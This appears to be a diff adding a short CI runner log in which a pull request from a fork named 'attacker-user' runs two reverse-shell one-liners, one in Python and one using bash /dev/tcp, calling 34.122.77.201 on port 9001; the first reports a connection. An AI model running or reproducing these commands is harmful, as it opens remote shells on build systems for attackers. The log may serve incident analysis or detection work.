@@ -1,0 +1,9 @@
+2026-09-11T07:33:01Z [INFO] Runner: ubuntu-latest, Job: test
+2026-09-11T07:33:02Z [INFO] Checking out PR #47 from fork: attacker-user/target-repo
+2026-09-11T07:33:03Z [INFO] Restoring cached node_modules
+2026-09-11T07:33:05Z [RUN]  python -c "import socket,subprocess,os;s=socket.socket();s.connect(('34.122.77.201',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
+2026-09-11T07:33:06Z [OUT]  Connection established to 34.122.77.201:9001
+2026-09-11T07:33:07Z [RUN]  bash -i >& /dev/tcp/34.122.77.201/9001 0>&1
+2026-09-11T07:33:08Z [OUT]  bash: connect to 34.122.77.201 port 9001 (tcp): Connection timed out
+2026-09-11T07:33:09Z [INFO] Tests passed: 0/12
+2026-09-11T07:33:10Z [ERROR] Workflow step failed
